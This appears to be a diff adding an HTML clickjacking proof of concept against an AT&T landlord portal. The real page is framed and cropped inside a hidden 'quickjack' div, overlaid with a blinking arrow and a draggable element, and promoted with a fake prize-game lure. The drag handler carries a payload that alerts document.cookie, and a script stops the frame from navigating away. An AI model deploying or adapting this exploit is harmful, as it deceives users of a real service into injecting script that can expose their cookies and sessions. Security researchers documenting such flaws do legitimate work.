@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two iframes</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+        }
+        .container {
+            position: relative;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 50%;
+        }
+        #cksl6 {
+            overflow: hidden;
+            width: 300px;
+            height: 121px;
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 2px solid #333;
+        }
+        #draggableElement {
+            background-color: #ff0000;
+            width: 300px;
+            height: 121px;
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            cursor: move;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #arrow {
+            width: 0;
+            height: 0;
+            border-left: 20px solid transparent;
+            border-right: 20px solid transparent;
+            border-bottom: 40px solid red;
+            position: absolute;
+            top: calc(50% - 20px);
+            left: 50%;
+            transform: translateX(-50%);
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .vertical-line {
+            position: absolute;
+            height: 100%;
+            border-right: 2px solid #333;
+            right: 0;
+            top: 0;
+        }
+        .heading-video-container {
+            position: absolute;
+            right: 0;
+            width: 50%;
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+            padding: 20px;
+            top: 0;
+            margin-top: 20px; /* Added margin */
+        }
+        .video-container {
+            margin-top: 20px;
+        }
+        .short-heading {
+            font-size: 20px; /* Adjusted font size */
+            margin-bottom: 10px; /* Added margin */
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div qjid="quickjack" id="cksl6">
+        <iframe name="cksl7" src="https://landlordportal.att.com/trackCases" style="border: 0pt none ; left: -974px; top: -444px; position: absolute; width: 1296px; height: 620px;" scrolling="no"></iframe>
+    </div>
+    <div id="arrow"></div>
+    <div id="draggableElement" draggable="true" ondragstart="drag(event)">
+        <img src="your-image.png" alt="Draggable Image">
+    </div>
+    <div class="vertical-line"></div>
+</div>
+<div class="heading-video-container">
+    <div class="short-heading">Tutorial on the Lovely game to win the prize From ATT</div> <!-- Shortened heading line -->
+    <div class="video-container">
+        <iframe width="560" height="315" src="https://youtu.be/lwXFExdtQqs" frameborder="0" allowfullscreen></iframe>
+    </div>
+</div>
+<script>
+    function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();
+
+    function drag(event) {
+        event.dataTransfer.setData('text/plain', '<img src=x onerror=alert(document.cookie)> click next button to game over...., ');
+        event.dataTransfer.setData('text/uri-list', 'https://via.placeholder.com/150');
+    }
+</script>
+</body>
+</html>
+
